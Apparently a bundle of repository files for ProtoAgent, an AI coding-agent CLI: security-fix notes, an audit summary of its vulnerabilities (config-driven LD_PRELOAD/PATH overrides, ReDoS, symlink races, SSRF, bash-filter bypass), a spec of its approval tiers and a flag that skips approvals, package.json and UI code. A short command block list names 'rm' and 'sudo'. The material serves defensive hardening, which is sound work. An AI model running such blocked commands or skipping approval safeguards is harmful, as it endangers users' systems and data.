// Safer to specify what's allowed
const SAFE_COMMANDS = ['git status', 'ls', ...];
// Than try to block all dangerous things
const DANGEROUS = ['rm', 'sudo', ...]; // Easy to bypass
\`\`\`

### 4. Documentation Pattern
Every security fix includes:
\`\`\`typescript
// Security: [What this does]
// Naive approach: [What's vulnerable]
// Risk: [Attack scenario]
// Fix: [What the code does]
\`\`\`

---

## Files Modified

### Source Files (11)
1. \`src/mcp.ts\` - MCP security
2. \`src/sessions.ts\` - Credential sanitization
3. \`src/tools/bash.ts\` - Command filtering
4. \`src/tools/edit-file.ts\` - Size limits, atomic write
5. \`src/tools/search-files.ts\` - ReDoS protection
6. \`src/tools/webfetch.ts\` - SSRF protection
7. \`src/tools/write-file.ts\` - Atomic write
8. \`src/utils/logger.ts\` - Credential redaction
9. \`src/utils/credential-filter.ts\` - NEW
10. \`src/utils/atomic-write.ts\` - NEW
11. \`src/utils/cost-tracker.ts\` - Type fix

### Documentation Files (5)
1. \`SECURITY.md\` - NEW
2. \`SECURITY_FIXES_IMPLEMENTED.md\` - NEW
3. \`docs/build-your-own/part-5.md\` - Updated
4. \`docs/build-your-own/part-6.md\` - Updated
5. \`docs/build-your-own/part-10.md\` - Updated

### Test Files (1)
1. \`tests/security-controls.test.ts\` - NEW

---

## Verification

### Build
\`\`\`bash
npm run build
# ✅ SUCCESS
\`\`\`

### Tests
\`\`\`bash
npm test
# 64 passing, 1 failing (pre-existing)
\`\`\`

### Type Checking
\`\`\`bash
npx tsc --noEmit
# ✅ No errors
\`\`\`

---

## Recommendations for Future Work

### Phase 2 (Optional Enhancements)
1. **Rate Limiting**: Per-session quotas for file operations
2. **Content Validation**: MIME type verification for uploads
3. **Audit Logging**: Structured security event logging
4. **Fuzz Testing**: Automated security testing

### Phase 3 (Production Hardening)
1. **Sandboxing**: Docker/container isolation documentation
2. **Secret Management**: Integration with system keychains
3. **Network Policies**: Egress filtering guidelines

---

## Conclusion

The security remediation successfully addresses the most critical vulnerabilities while maintaining the educational nature of the codebase. The fixes follow industry best practices and provide clear documentation for learners to understand the security implications.

**Risk Reduction**: HIGH → MEDIUM-LOW  
**Code Quality**: Improved through deduplication  
**Documentation**: Comprehensive security guide added  
**Maintainability**: Centralized security utilities
`,
  },
  {
    path: "SECURITY_SUMMARY.txt",
    content: `================================================================================
                    PROTOAGENT SECURITY AUDIT SUMMARY
================================================================================

PROJECT TYPE: TypeScript-based AI Coding Agent CLI
ANALYSIS DATE: 2026-03-22
OVERALL RISK LEVEL: MEDIUM

================================================================================
VULNERABILITY COUNT BY SEVERITY
================================================================================

Critical:     1 vulnerability
High:         3 vulnerabilities  
Medium:       7 vulnerabilities
Low:          3 vulnerabilities
─────────────────────────
TOTAL:       14 identified vulnerabilities

================================================================================
TOP CRITICAL ISSUES REQUIRING IMMEDIATE ACTION
================================================================================

1. CRITICAL - MCP Environment Variable Sanitization
   Location: src/mcp.ts (lines 56-65), src/runtime-config.ts (lines 100-109)
   Impact: Potential Remote Code Execution via malicious config files
   Risk: Attackers could override PATH, LD_PRELOAD, and other critical env vars
   Fix: Whitelist allowed environment variables, validate values

2. HIGH - API Keys in Error Logs
   Location: src/agentic-loop.ts (lines 840-844)
   Impact: Credential exposure in logs if API calls fail
   Risk: Production credentials could leak through error messages
   Fix: Implement credential redaction in error handling

3. HIGH - ReDoS (Regex Denial of Service) Vulnerability
   Location: src/tools/search-files.ts (lines 196-203)
   Impact: Service disruption through regex backtracking attacks
   Risk: Malicious regex patterns could hang the application
   Fix: Use safe-regex library, implement operation timeouts

4. HIGH - Symlink Race Condition in Path Validation
   Location: src/utils/path-validation.ts (lines 48-80)
   Impact: Directory traversal bypass through race conditions
   Risk: TOCTOU vulnerability - files could escape sandbox between check and use
   Fix: Use O_NOFOLLOW flag, verify immediately before operations

5. MEDIUM - Insufficient MCP Command Validation
   Location: src/runtime-config.ts (lines 36-52), src/mcp.ts (lines 52-92)
   Impact: Command injection through malicious config
   Risk: Arbitrary commands could be executed as child processes
   Fix: Validate command paths, whitelist known servers

================================================================================
ADDITIONAL MEDIUM-PRIORITY ISSUES
================================================================================

6. Weak Bash Command Filtering (Bypass vulnerabilities)
7. Missing URL Redirect Target Validation (SSRF/Open Redirect)
8. Edit File Fuzzy Matching Memory Exhaustion
9. No Rate Limiting on File Operations (DoS)
10. Inconsistent Credential Masking in Output

================================================================================
LOW-PRIORITY ISSUES
================================================================================

11. Log Injection via ANSI Escape Sequences
12. Unvalidated Custom HTTP Headers
13. .env File Configuration Disclosure
14. Dependency Version Management

================================================================================
POSITIVE SECURITY FINDINGS
================================================================================

✓ Strong path validation for directory traversal prevention
✓ Comprehensive three-tier approval system for operations
✓ Proper file permission hardening (0o600/0o700)
✓ Ripgrep integration for safer regex operations
✓ Comprehensive timeout protections
✓ Good symlink attack awareness
✓ No SQL injection vulnerabilities (not database app)
✓ No eval() or Function() code execution
✓ Proper error handling and recovery

================================================================================
ACTIONABLE RECOMMENDATIONS
================================================================================

IMMEDIATE (This Sprint):
- Add MCP environment variable whitelist
- Implement error log credential redaction
- Add regex complexity validation

SHORT-TERM (Next 2 Weeks):
- Fix symlink race conditions
- Validate MCP server commands
- Improve bash filtering
- Add URL redirect validation

LONG-TERM:
- Implement resource rate limiting
- Add comprehensive input validation tests
- Set up automated security scanning
- Establish pre-commit security hooks

================================================================================
TESTING RECOMMENDATIONS
================================================================================

- Fuzzing: Test with malformed configs and large inputs
- Penetration Testing: Attempt privilege escalation and sandbox escapes
- Dependency Scanning: Use npm audit and automated tools
- Code Review: Security-focused review of critical paths
- Integration Testing: Test interaction between security layers

================================================================================
SECURITY BEST PRACTICES TO IMPLEMENT
================================================================================

1. Add SECURITY.md documenting threat model
2. Establish security.txt for responsible disclosure
3. Implement pre-commit hooks for secret detection
4. Add automated dependency vulnerability scanning
5. Conduct quarterly security reviews
6. Implement audit logging for all sensitive operations
7. Add security questions to pull request template

================================================================================
CONCLUSION
================================================================================

ProtoAgent demonstrates good security fundamentals with thoughtful design
choices around path validation, approvals, and credentials. The identified
vulnerabilities are primarily in advanced attack scenarios and edge cases.

Implementing fixes for the 5 critical/high priority items would significantly
improve the security posture. The project is suitable for educational use and
trusted environments but should address these issues before use in production
or untrusted contexts.

Estimated effort to remediate all issues: 3-5 engineering weeks

For full details, see: SECURITY_AUDIT_REPORT.md

================================================================================
`,
  },
  {
    path: "SPEC.md",
    content: `# ProtoAgent Specification

ProtoAgent is a small TypeScript coding agent CLI built to be readable, hackable, and useful enough for real project work.

This spec describes what the current implementation in \`src/\` actually does.

For the companion runtime/module walkthrough, see \`ARCHITECTURE.md\`.

## 1. Goals

1. **Readable** — the core system should stay compact enough to understand without a framework tour.
2. **Useful** — it should support real coding workflows: reading code, editing files, running commands, resuming sessions, and consulting external context.
3. **Extensible** — new tools, providers, skills, and MCP integrations should fit naturally into the existing structure.

## 2. Architecture Overview

\`\`\`text
CLI (Commander)
  -> Ink TUI
     -> Agentic Loop
        -> OpenAI SDK client
        -> Built-in tools
        -> Dynamic tools from skills and MCP
        -> Special sub-agent tool
\`\`\`

### Main modules

| Area | Files | Responsibility |
|---|---|---|
| CLI | \`src/cli.tsx\` | Parses flags, starts the main app, or launches \`configure\` |
| UI | \`src/App.tsx\`, \`src/components/*\` | Renders the conversation, approvals, collapsible output, formatted messages |
| Loop | \`src/agentic-loop.ts\` | Runs the streaming tool-use loop and retry logic |
| Config | \`src/config.tsx\`, \`src/providers.ts\` | Stores config, loads providers/models, resolves API keys |
| Tools | \`src/tools/*\` | Built-in tool schemas and handlers |
| Sessions | \`src/sessions.ts\` | Saves and resumes messages and TODO state |
| Skills | \`src/skills.ts\` | Discovers validated skill directories and exposes \`activate_skill\` |
| MCP | \`src/mcp.ts\` | Loads MCP servers and registers their tools dynamically |
| Utilities | \`src/utils/*\` | Approval, compaction, cost estimation, logging, message formatting, path validation |

## 3. CLI and Interaction Model

### CLI entry points

- \`protoagent\`
- \`protoagent configure\`

### CLI flags

- \`--dangerously-accept-all\`
- \`--log-level <level>\`
- \`--session <id>\`

### Interactive slash commands

Inside the TUI, the current app supports:

- \`/collapse\`
- \`/expand\`
- \`/help\`
- \`/quit\`
- \`/exit\`

The UI also supports aborting an in-flight completion with \`Esc\`.

## 4. Configuration System

ProtoAgent uses two configuration layers:

- persisted user selection in \`config.json\`
- extensibility and runtime overrides in \`protoagent.jsonc\`

### Persisted session config

ProtoAgent stores user selection at:

- macOS/Linux: \`~/.local/share/protoagent/config.json\`
- Windows: \`%USERPROFILE%/AppData/Local/protoagent/config.json\`

Stored fields:

\`\`\`json
{
  "provider": "openai",
  "model": "gpt-5-mini",
  "apiKey": "..."
}
\`\`\`

This file remains intentionally small. It stores the selected provider, selected model, and an optional explicit API key.

### Unified extensibility config

ProtoAgent also reads \`protoagent.jsonc\` from these locations:

- \`<process.cwd()>/.protoagent/protoagent.jsonc\`
- \`~/.config/protoagent/protoagent.jsonc\`

All files are optional. If multiple files are present, they are merged in this order:

1. built-in defaults from source
2. \`~/.config/protoagent/protoagent.jsonc\`
3. \`<process.cwd()>/.protoagent/protoagent.jsonc\`

Later entries win on conflict.

### Top-level shape

\`\`\`jsonc
{
  "providers": {
    "openai": {
      "name": "OpenAI",
      "apiKeyEnvVar": "OPENAI_API_KEY",
      "models": {
        "gpt-5.2": {
          "name": "GPT-5.2",
          "contextWindow": 200000,
          "inputPricePerMillion": 6.0,
          "outputPricePerMillion": 24.0
        }
      }
    },
    "cf-openai": {
      "name": "OpenAI via CF Gateway",
      "baseURL": "https://opencode.cloudflare.dev/openai/",
      "apiKey": "none",
      "headers": {
        "cf-access-token": "\${CF_ACCESS_TOKEN}",
        "X-Requested-With": "xmlhttprequest"
      },
      "defaultParams": {
        "store": false
      },
      "models": {
        "gpt-4o": {
          "name": "GPT-4o",
          "contextWindow": 128000,
          "inputPricePerMillion": 2.5,
          "outputPricePerMillion": 10.0
        }
      }
    }
  },
  "mcp": {
    "servers": {
      "filesystem": {
        "type": "stdio",
        "command": "npx",
        "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]
      }
    }
  }
}
\`\`\`

### Provider rules

- \`providers\` may define entirely new providers or override built-in providers by ID.
- Provider IDs must be unique after merge.
- Provider \`models\` are keyed by model ID and merge by key.
- Project config overrides user config for both provider metadata and model metadata.
- JSONC comments are allowed in source files but are ignored at runtime.

### Environment interpolation

Any string value in \`protoagent.jsonc\` may include \`\${VAR_NAME}\` placeholders.

- interpolation happens at load time
- missing variables resolve to an empty string
- missing variables log a warning
- empty header values are dropped after interpolation

### Runtime precedence

Environment variables remain first-class runtime overrides and take precedence over file config.

Resolution order:

- API key:
  1. \`config.apiKey\`
  2. explicit environment override for the active provider
  3. \`PROTOAGENT_API_KEY\`
  4. \`provider.apiKey\`
  5. \`process.env[provider.apiKeyEnvVar]\`
  6. \`'none'\` when the provider uses header-based auth and no bearer token is required
  7. otherwise throw
- base URL:
  1. \`PROTOAGENT_BASE_URL\`
  2. \`provider.baseURL\`
  3. built-in default
- headers:
  1. \`PROTOAGENT_CUSTOM_HEADERS\`
  2. \`provider.headers\`
  3. built-in default headers

### Request parameter defaults

Providers and models may declare request defaults:

- provider-level \`defaultParams\`
- model-level \`defaultParams\`

Model defaults override provider defaults.

These defaults may tune request behavior such as:

- \`temperature\`
- \`top_p\`
- \`max_tokens\`
- \`store\`
- \`parallel_tool_calls\`

Reserved request fields must not be overridden by config:

- \`model\`
- \`messages\`
- \`tools\`
- \`tool_choice\`
- \`stream\`
- \`stream_options\`

ProtoAgent should validate these keys and warn or reject invalid config rather than silently changing core agent behavior.

### Interactive setup

- If no \`config.json\` exists, the main app shows an inline first-run setup flow.
- \`protoagent configure\` launches the standalone wizard.
- Interactive setup uses the merged provider registry from built-ins plus \`protoagent.jsonc\`.
- Providers that already resolve auth from env vars or header-based config should not require a placeholder API key prompt.

### Migration stance

- \`.protoagent/providers.json\` and \`.protoagent/mcp.json\` are replaced by \`.protoagent/protoagent.jsonc\`.
- Backwards-compatible env vars remain supported during development.
- Since ProtoAgent is still in development, file-format cleanup and provider cleanup can be done without preserving old config shapes long term.

## 5. Provider and Model Support

ProtoAgent uses the OpenAI SDK directly.

Built-in providers ship in source, but the runtime provider registry is the merged result of:

- built-in providers
- user \`protoagent.jsonc\`
- project \`protoagent.jsonc\`

Each provider may declare:

- provider ID
- human-readable provider name
- optional OpenAI-compatible \`baseURL\`
- optional \`apiKey\`
- optional \`apiKeyEnvVar\`
- optional default headers
- optional request \`defaultParams\`
- one or more models

Each model entry may declare:

- model ID
- human-readable name
- context window
- per-million input pricing
- per-million output pricing
- model-level \`defaultParams\`

The model picker and all provider lookups operate on this merged runtime registry rather than a hardcoded provider list alone.

## 6. Agentic Loop

The core loop in \`src/agentic-loop.ts\` works like this:

1. Start from the current message history.
2. Refresh or insert the system prompt.
3. Send the conversation and tool definitions to the model.
4. Stream text and tool call deltas.
5. If tool calls are returned, execute them and append tool results.
6. Repeat until the model returns plain assistant text.

### Important implementation details

- Responses stream token-by-token.
- Tool calls are accumulated across chunks.
- Tool call names and JSON arguments are sanitized when providers emit malformed streamed fragments.
- Usage data is captured from streaming responses when available.
- The loop emits typed UI events instead of rendering directly.
- The default max iteration limit is 100.

### Retry behavior

The loop currently retries on:

- \`429\` rate limits
- \`408\`, \`409\`, and \`425\`
- \`5xx\` server failures
- selected network transport errors like \`ECONNRESET\`, \`ETIMEDOUT\`, and \`EAI_AGAIN\`

It also has a repair path for provider rejections caused by malformed tool payload round-trips.

## 7. Tool System

Each built-in tool exports:

1. a JSON schema
2. a handler function

\`src/tools/index.ts\` collects built-ins and dispatches calls. It also supports runtime registration for dynamic tools.

### Built-in tools

| Tool | Purpose |
|---|---|
| \`read_file\` | Read file contents with line slicing |
| \`write_file\` | Create or overwrite a file |
| \`edit_file\` | Exact-string replacement in an existing file |
| \`list_directory\` | List directory contents |
| \`search_files\` | Recursive literal-text search with extension filters |
| \`bash\` | Run shell commands with safe/ask/deny behavior |
| \`todo_read\` / \`todo_write\` | Session-scoped task tracking |
| \`webfetch\` | Fetch one web URL as text, markdown, or raw HTML |

### Dynamic tools

Two systems can register runtime tools:

- **MCP** tools from configured servers
- **Skills** via the dynamic \`activate_skill\` tool

### Special tool

\`sub_agent\` is exposed by the agent loop itself rather than the normal tool registry.

## 8. File and Path Safety

All file tools validate requested paths through \`src/utils/path-validation.ts\`.

### Current behavior

- paths must resolve inside \`process.cwd()\`
- symlinks are resolved before the final allow check
- for files that do not exist yet, the parent directory is validated
- activated skill directories are added as extra allowed roots

## 9. Approval Model

ProtoAgent requires approval for risky operations.

### Approval categories

- \`file_write\`
- \`file_edit\`
- \`shell_command\`

### Current behavior

- approvals can be granted once or for the current session scope
- approval keys are scoped by session ID plus operation scope
- if \`--dangerously-accept-all\` is enabled, normal approvals are skipped
- if no approval handler is registered, the system fails closed and rejects the request

### Shell command safety tiers

\`src/tools/bash.ts\` uses three tiers:

1. safe commands that auto-run
2. hard-blocked dangerous patterns that always fail
3. everything else requiring approval

## 10. Session Persistence

Sessions are stored as JSON files in:

- macOS/Linux: \`~/.local/share/protoagent/sessions/\`
- Windows: \`%USERPROFILE%/AppData/Local/protoagent/sessions/\`

### Session contents

- UUID session ID
- title
- created/updated timestamps
- provider and model
- full completion message history
- TODO state

### Current behavior

- session files are permission-hardened on Unix-like systems
- session IDs are validated before file access
- resuming a session refreshes the system prompt at the top of the message list
- helper functions exist for list/load/save/delete, though the main user-facing flow is \`--session <id>\`

## 11. Cost Tracking and Compaction

### Cost tracking

\`src/utils/cost-tracker.ts\` provides:

- rough token estimation using a character heuristic
- conversation token estimation
- cost calculation from provider pricing
- context utilization estimates

### Compaction

\`src/utils/compactor.ts\` compacts conversations at 90% context usage.

Current strategy:

- keep the current system prompt
- summarize older middle messages with a dedicated compression prompt
- preserve recent messages verbatim
- preserve protected skill tool messages containing \`<skill_content ...>\`

## 12. Skills

ProtoAgent supports validated local skills.

### Discovery roots

Project-level:

- \`.agents/skills/\`
- \`.protoagent/skills/\`

User-level:

- \`~/.agents/skills/\`
- \`~/.protoagent/skills/\`
- \`~/.config/protoagent/skills/\`

### Skill format

Each skill is a directory containing \`SKILL.md\` with YAML frontmatter.

Required metadata:

- \`name\`
- \`description\`

Current validation also supports:

- \`compatibility\`
- \`license\`
- \`metadata\`
- \`allowed-tools\`

### Runtime behavior

- project skills override user skills with the same name
- the system prompt includes a catalog of available skills
- ProtoAgent registers \`activate_skill\` dynamically when skills exist
- activating a skill returns the skill body plus bundled resource listings
- skill resources can come from \`scripts/\`, \`references/\`, and \`assets/\`

\`allowed-tools\` is parsed but not enforced as a hard permission boundary.

## 13. MCP Support

ProtoAgent reads MCP configuration from the merged \`protoagent.jsonc\` runtime config and supports:

- **stdio** MCP servers
- **HTTP / Streamable HTTP** MCP servers

### Current behavior

- configured servers are connected on app initialization
- discovered MCP tools are registered dynamically as namespaced tools
- tool results are normalized into text output when possible
- connections are closed on cleanup

Recommended MCP config shape:

\`\`\`jsonc
{
  "mcp": {
    "servers": {
      "my-stdio-server": {
        "type": "stdio",
        "command": "npx",
        "args": ["-y", "@my/mcp-server"]
      },
      "my-http-server": {
        "type": "http",
        "url": "http://localhost:3000/mcp"
      }
    }
  }
}
\`\`\`

Future-compatible server fields may include:

- \`enabled\`
- \`cwd\`
- \`env\`
- \`headers\`
- \`timeoutMs\`

OAuth is not implemented.

## 14. Web Fetching

\`webfetch\` fetches one HTTP(S) URL and returns structured output.

### Supported formats

- \`text\`
- \`markdown\`
- \`html\`

### Current limits

- max URL length: 4096
- default timeout: 30s
- max timeout: 120s
- max redirects: 10
- max response size: 5 MB
- max output size: 2 MB
- text-like MIME types only

For HTML content, ProtoAgent converts to text or Markdown when requested.

## 15. Sub-agents

ProtoAgent exposes a \`sub_agent\` tool for isolated child work.

### Current behavior

- child runs get a fresh system prompt and isolated message history
- they use the normal built-in and dynamic tools
- \`sub_agent\` is not recursively re-exposed inside child runs
- \`max_iterations\` defaults to 30
- only the child's final answer is returned to the parent

Because child runs share the same process-level handlers, normal approvals can still appear for writes, edits, and non-safe shell commands.

## 16. Terminal UI

The Ink UI in \`src/App.tsx\` currently provides:

- message rendering for user, assistant, system, and tool messages
- collapsible boxes for long system and tool output
- consolidated tool-call/result rendering
- formatted assistant output via \`FormattedMessage\`
- table-friendly rendering helpers
- inline approval prompts
- inline first-run setup
- session-aware quit flow that shows a resume command
- usage and cost display
- recent log capture for UI display

## 17. Logging

\`src/utils/logger.ts\` provides file-backed logging with levels:

- \`ERROR\`
- \`WARN\`
- \`INFO\`
- \`DEBUG\`
- \`TRACE\`

Logs are written under the user's ProtoAgent data directory rather than printed directly into the Ink render stream.

## 18. Known Omissions and Intentional Limits

ProtoAgent intentionally does not currently implement:

- sandboxing
- git-based undo/snapshots
- advanced edit fallback strategies
- skill dependency resolution or enforced allowed-tool constraints
- built-in web search APIs
- session branching
- MCP OAuth
- non-interactive RPC/server modes

Those are reasonable extension points, but they are outside the current scope of the code in \`src/\`.
`,
  },
  {
    path: "package.json",
    content: `{
  "name": "protoagent",
  "version": "0.1.14",
  "type": "module",
  "files": [
    "dist",
    "README.md"
  ],
  "bin": {
    "protoagent": "./dist/cli.js"
  },
  "scripts": {
    "clean": "node -e \\"require('node:fs').rmSync('dist', { recursive: true, force: true })\\"",
    "dev": "tsx src/cli.tsx",
    "test": "node --test --import tsx tests/**/*.test.{ts,tsx}",
    "build": "npm run clean && tsc && node -e \\"const fs=require('node:fs'); if (fs.existsSync('dist/cli.js')) fs.chmodSync('dist/cli.js', 0o755)\\"",
    "build:watch": "tsc --watch",
    "prepack": "npm run build",
    "docs:dev": "concurrently \\"npm run docs:dev:worker\\" \\"npm run docs:dev:docs\\" --kill-others",
    "docs:dev:worker": "cd docs/worker && npm exec wrangler -- dev --port 8787 --ip 0.0.0.0",
    "docs:dev:docs": "vitepress dev docs --port 5173 --host",
    "docs:build": "vitepress build docs",
    "docs:preview": "vitepress preview docs"
  },
  "author": "Thomas Gauvin",
  "license": "MIT",
  "homepage": "https://protoagent.dev",
  "repository": {
    "type": "git",
    "url": "https://github.com/thomasgauvin/protoagent.git"
  },
  "keywords": [
    "ai",
    "agent",
    "cli",
    "coding-agent",
    "llm",
    "openai",
    "anthropic",
    "gemini",
    "terminal",
    "typescript"
  ],
  "engines": {
    "node": ">=20"
  },
  "dependencies": {
    "@inkjs/ui": "^2.0.0",
    "@modelcontextprotocol/sdk": "^1.27.1",
    "commander": "^14.0.1",
    "he": "^1.2.0",
    "html-to-text": "^9.0.5",
    "ink": "^6.8.0",
    "ink-big-text": "^2.0.0",
    "jsonc-parser": "^3.3.1",
    "openai": "^5.23.1",
    "react": "^19.1.1",
    "turndown": "^7.2.2",
    "yaml": "^2.8.2",
    "yoga-layout": "^3.2.1"
  },
  "devDependencies": {
    "@eslint/js": "^9.36.0",
    "@tailwindcss/postcss": "^4.1.18",
    "@types/he": "^1.2.3",
    "@types/html-to-text": "^9.0.4",
    "@types/node": "^24.5.2",
    "@types/react": "^19.1.15",
    "@types/turndown": "^5.0.6",
    "concurrently": "^9.1.2",
    "eslint": "^9.36.0",
    "ink-testing-library": "^4.0.0",
    "tailwindcss": "^4.0.0",
    "tsx": "^4.20.6",
    "typescript": "^5.9.2",
    "typescript-eslint": "^8.44.1",
    "vitepress": "^1.6.4"
  }
}
`,
  },
  {
    path: "postcss.config.js",
    content: `export default {
  plugins: {
    '@tailwindcss/postcss': {},
  },
}
`,
  },
  {
    path: "src/App.tsx",
    content: `/**
Main UI component — the heart of ProtoAgent's terminal interface.

Renders the chat loop, tool call feedback, approval prompts,
and cost/usage info. All heavy logic lives in \`agentic-loop.ts\`;
this file is purely presentation + state wiring.

Here's how the terminal UI is laid out (showcasing all options at once for demonstration, but in practice many elements are conditional on state):
┌─────────────────────────────────────────┐
│  ProtoAgent  (BigText logo)             │  static, rendered once (printBanner)
│  Model: Anthropic / claude-3-5 | Sess.. │  static header (printRuntimeHeader)
│  Debug logs: /path/to/log               │  static, if --log-level set
├─────────────────────────────────────────┤
│                                         │
│  [System Prompt ▸ collapsed]            │  archived (memoized)
│                                         │
│  > user message                         │  archived (memoized)
│                                         │
│  assistant reply text                   │  archived (memoized)
│                                         │
│  [tool_name ▸ collapsed]                │  archived (memoized)
│                                         │
│  > user message                         │  archived (memoized)
│                                         │
├ ─ ─ ─ ─ ─ ─ ─ live boundary ─ ─ ─ ─ ─ ─ ┤
│                                         │
│  assistant streaming text...            │  live (re-renders, ~50ms debounce)
│                                         │
│  [tool_name ▸ collapsed]                │  live (re-renders on tool_result)
│                                         │
│  Thinking...                            │  live, only if last msg is user
│                                         │
│ ╭─ Approval Required ─────────────────╮ │  live, only when pending approval
│ │  description / detail               │ │
│ │  ○ Approve once                     │ │
│ │  ○ Approve for session              │ │
│ │  ○ Reject                           │ │
│ ╰─────────────────────────────────────╯ │
│                                         │
│  [Error: message]                       │  live, inline thread errors
│                                         │
├─────────────────────────────────────────┤
│  tokens: 1234↓ 56↑ | ctx: 12% | \$0.02   │  static-ish, updates after each turn
├─────────────────────────────────────────┤
│  /quit  — Exit ProtoAgent               │  dynamic, shown when typing /
├─────────────────────────────────────────┤
│  ⠹ Running read_file...                 │  dynamic, shown while loading
├─────────────────────────────────────────┤
│ ╭─────────────────────────────────────╮ │
│ │ > [text input cursor              ] │ │  always visible when initialized
│ ╰─────────────────────────────────────╯ │
├─────────────────────────────────────────┤
│  Session saved. Resume with:            │  one-shot, shown on /quit
│  protoagent --session abc12345          │
└─────────────────────────────────────────┘
*/

import React, { useState, useEffect, useCallback, useRef } from 'react';
import { Box, Text, Static, useApp, useInput, useStdout } from 'ink';
import { LeftBar } from './components/LeftBar.js';
import { TextInput, Select } from '@inkjs/ui';
import { OpenAI } from 'openai';
import { readConfig, writeConfig, writeInitConfig, resolveApiKey, type Config, type InitConfigTarget, TargetSelection, ModelSelection, ApiKeyInput } from './config.js';
import { loadRuntimeConfig, getActiveRuntimeConfigPath } from './runtime-config.js';
import { getProvider, getModelPricing, getRequestDefaultParams } from './providers.js';
import {
  runAgenticLoop,
  initializeMessages,
  type Message,
  type AgentEvent,
} from './agentic-loop.js';
import { setDangerouslySkipPermissions, setApprovalHandler, clearApprovalHandler } from './tools/index.js';
import type { ApprovalRequest, ApprovalResponse } from './utils/approval.js';
import { setLogLevel, LogLevel, initLogFile, logger } from './utils/logger.js';
import {
  createSession,
  ensureSystemPromptAtTop,
  saveSession,
  loadSession,
  generateTitle,
  type Session,
} from './sessions.js';
import { clearTodos, getTodosForSession, setTodosForSession } from './tools/todo.js';
import { initializeMcp, closeMcp, getConnectedMcpServers } from './mcp.js';
import { generateSystemPrompt } from './system-prompt.js';
import { renderFormattedText } from './utils/format-message.js';

interface InlineThreadError {
  id: string;
  message: string;
  transient?: boolean;
}

// A single item rendered by <Static>. Each item is appended once and
// permanently flushed to the terminal scrollback by Ink's Static component.
interface StaticItem {
  id: string;
  node: React.ReactNode;
}

type AddStaticFn = (node: React.ReactNode) => void;

// ─── Scrollback helpers ───
// These functions append text to the permanent scrollback buffer via the
// <Static> component. Ink flushes new Static items within its own render
// cycle, so there are no timing issues with write()/log-update.

function printBanner(addStatic: AddStaticFn): void {
  addStatic(
    <Text>
      <Text color="#09A469">█▀█ █▀█ █▀█ ▀█▀ █▀█ ▄▀█ █▀▀ █▀▀ █▄ █ ▀█▀</Text>
      {'\\n'}
      <Text color="#09A469">█▀▀ █▀▄ █▄█  █  █▄█ █▀█ █▄█ ██▄ █ ▀█  █</Text>
      {'\\n'}
    </Text>
  );
}

function printRuntimeHeader(addStatic: AddStaticFn, config: Config, session: Session | null, dangerouslySkipPermissions: boolean): void {
  const provider = getProvider(config.provider);
  let line = \`Model: \${provider?.name || config.provider} / \${config.model}\`;
  if (dangerouslySkipPermissions) line += ' (auto-approve all)';
  if (session) line += \` | Session: \${session.id}\`;
  
  const lines: React.ReactNode[] = [<Text key="model" dimColor>{line}</Text>];
  
  const logFilePath = logger.getLogFilePath();
  if (logFilePath) {
    lines.push(<Text key="log" dimColor>Debug logs: {logFilePath}</Text>);
  }
  const configPath = getActiveRuntimeConfigPath();
  if (configPath) {
    lines.push(<Text key="config" dimColor>Config file: {configPath}</Text>);
  }
  const mcpServers = getConnectedMcpServers();
  if (mcpServers.length > 0) {
    lines.push(<Text key="mcp" dimColor>MCPs: {mcpServers.join(', ')}</Text>);
  }
  
  addStatic(
    <Text>
      {lines.map((l, i) => <React.Fragment key={i}>{l}{'\\n'}</React.Fragment>)}
      {'\\n'}
    </Text>
  );
}

function normalizeTranscriptText(text: string): string {
  const normalized = text.replace(/\\r\\n/g, '\\n');
  const lines = normalized.split('\\n');
  while (lines.length > 0 && lines[0].trim() === '') lines.shift();
  while (lines.length > 0 && lines[lines.length - 1].trim() === '') lines.pop();
  return lines.join('\\n');
}

function printMessageToScrollback(addStatic: AddStaticFn, role: 'user' | 'assistant', text: string): void {
  const normalized = normalizeTranscriptText(text);
  if (!normalized) {
    addStatic(<Text>{'\\n'}</Text>);
    return;
  }
  if (role === 'user') {
    addStatic(
      <Text>
        <Text color="green">{'>'}</Text> {normalized}{'\\n'}
      </Text>
    );
    return;
  }
  // Apply Markdown formatting (bold, italic) to assistant messages
  addStatic(<Text>{renderFormattedText(normalized)}{'\\n'}</Text>);
}

/**
 * Format a sub-agent tool call into a human-readable activity string.
 * Shows what the sub-agent is actually doing, e.g. "Sub-agent reading file package.json"
 */
function formatSubAgentActivity(tool: string, args?: Record<string, unknown>): string {
  if (!args || typeof args !== 'object') {
    return \`Sub-agent running \${tool}...\`;
  }

  const argEntries = Object.entries(args);
  if (argEntries.length === 0) {
    return \`Sub-agent running \${tool}...\`;
  }

  // Extract the most meaningful argument based on the tool
  let detail = '';
  const firstValue = argEntries[0]?.[1];

  switch (tool) {
    case 'read_file':
      detail = typeof args.file_path === 'string' ? args.file_path : '';
      break;
    case 'write_file':
      detail = typeof args.file_path === 'string' ? args.file_path : '';
      break;
    case 'edit_file':
      detail = typeof args.file_path === 'string' ? args.file_path : '';
      break;
    case 'list_directory':
      detail = typeof args.directory_path === 'string' ? args.directory_path : '(current)';
      break;
    case 'search_files':
      detail = typeof args.search_term === 'string' ? \`"\${args.search_term}"\` : '';
      break;
    case 'bash':
      detail = typeof args.command === 'string'
        ? args.command.split(/\\s+/).slice(0, 3).join(' ') + (args.command.split(/\\s+/).length > 3 ? '...' : '')
        : '';
      break;
    case 'todo_write':
      detail = Array.isArray(args.todos) ? \`\${args.todos.length} task(s)\` : '';
      break;
    case 'webfetch':
      detail = typeof args.url === 'string' ? new URL(args.url).hostname : '';
      break;
    case 'sub_agent':
      // Nested sub-agent
      detail = 'nested task...';
      break;
    default:
      // Use the first argument value as fallback
      detail = typeof firstValue === 'string'
        ? firstValue.length > 30 ? firstValue.slice(0, 30) + '...' : firstValue
        : '';
  }

  if (detail) {
    return \`Sub-agent \${tool.replace(/_/g, ' ')}: \${detail}\`;
  }

  return \`Sub-agent running \${tool}...\`;
}

/**
 * Format a tool call into a human-readable string showing the tool name and key argument.
 * Shows what the tool is actually doing, e.g. "read_file src/App.tsx"
 */
function formatToolActivity(tool: string, args?: Record<string, unknown>): string {
  if (!args || typeof args !== 'object') {
    return tool;
  }

  let detail = '';

  switch (tool) {
    case 'read_file':
      detail = typeof args.file_path === 'string' ? args.file_path : '';
      break;
    case 'write_file':
      detail = typeof args.file_path === 'string' ? args.file_path : '';
      break;
    case 'edit_file':
      detail = typeof args.file_path === 'string' ? args.file_path : '';
      break;
    case 'list_directory':
      detail = typeof args.directory_path === 'string' ? args.directory_path : '(current)';
      break;
    case 'search_files':
